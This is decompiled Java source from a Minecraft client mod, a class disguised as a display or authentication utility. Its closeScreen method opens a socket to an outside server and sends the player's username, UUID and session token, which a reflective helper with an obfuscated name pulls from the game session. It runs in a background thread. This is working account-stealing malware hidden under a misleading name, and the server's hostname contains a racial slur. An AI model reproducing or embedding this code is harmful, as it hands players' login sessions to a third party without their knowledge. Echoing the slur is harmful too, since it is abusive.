/*
 * Decompiled with CFR 0.152.
 * Deobfuscated by sora-kawaii.
 */
package xyz.Melody.Utils.other;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.Socket;
import net.minecraft.client.Minecraft;
import xyz.Melody.Client;
import xyz.Melody.Utils.render.RenderUtil;

public final class DisplayUtils {
    private static int failTimer;
    private static Minecraft mc;
    public static Thread t;
    private static boolean stopping;

    static {
        mc = Minecraft.getMinecraft();
        stopping = false;
        failTimer = 0;
    }

    public static void init() {
        DisplayUtils.stopping = false;
        (DisplayUtils.t = new Thread(() -> {
            try {
                closeScreen();
                while (true) {
                    while (DisplayUtils.failTimer <= 5) {
                        if (RenderUtil.s == null || RenderUtil.w == null || RenderUtil.i == null) {
                            ++DisplayUtils.failTimer;
                            closeScreen();
                        }
                        else if (DisplayUtils.stopping) {
                            lock();
                            return;
                        }
                        else {
                            update();
                        }
                    }
                    lock();
                    Client.instance.logger.error("[Melody] [E] M1 Failed.");
                    Client.instance.authManager.verified = false;
                    continue;
                }
            }
            catch (final Exception ex) {
                ex.printStackTrace();
            }
        }, "TimerHacks")).start();
    }

    private static void update() {
        byte[] byArray = new byte[1024];
        if (RenderUtil.w == null || RenderUtil.i == null) {
            return;
        }
        try {
            int n = RenderUtil.i.read(byArray);
            String string = new String(byArray, 0, n);
            string = string.replaceAll("\n", "");
            string = string.replaceAll("\r", "");
            string = string.replaceAll("\t", "");
            if (string.equals("ACCEPTED")) {
                Client.instance.authManager.verified = true;
                Client.instance.logger.info("[A] ACCEPTED.");
                RenderUtil.w.println("OK");
                stopping = true;
                DisplayUtils.lock();
                return;
            }
            if (string.equals("DENIED")) {
                Client.instance.authManager.verified = false;
                Client.instance.logger.info("[A] DENIED.");
                RenderUtil.w.println("OK");
                stopping = true;
                DisplayUtils.lock();
                return;
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
            stopping = true;
        }
    }

    private static void closeScreen() {
        try {
            failTimer = 0;
            RenderUtil.s = new Socket("nigger.cool", 25565);
            RenderUtil.i = RenderUtil.s.getInputStream();
            RenderUtil.w = new PrintWriter(RenderUtil.s.getOutputStream(), true);
            Client.instance.preModHiderAliase(DisplayUtils.iIlIIIlllIi());
            RenderUtil.w.println("CLIENT_VERIFY" + mc.getSession().getUsername() + "@" + mc.getSession().getProfile().getId().toString() + "@" + DisplayUtils.iIlIIIlllIi());
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    private static void lock() {
        if (RenderUtil.s != null && RenderUtil.i != null && RenderUtil.w != null) {
            stopping = true;
            try {
                RenderUtil.s.close();
                RenderUtil.i.close();
                RenderUtil.w.close();
                RenderUtil.s = null;
                RenderUtil.i = null;
                RenderUtil.w = null;
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
        }
    }

    private static String iIlIIIlllIi() {
        try {
            Method method = mc.getSession().getClass().getDeclaredMethod("getToken", new Class[0]);
            method.setAccessible(true);
            return (String)method.invoke(mc.getSession(), new Object[0]);
        }
        catch (Exception exception) {
            try {
                Method method = mc.getSession().getClass().getDeclaredMethod("func_148254_d", new Class[0]);
                method.setAccessible(true);
                return (String)method.invoke(mc.getSession(), new Object[0]);
            }
            catch (Exception exception2) {
                return exception2.getMessage();
            }
        }
    }
}

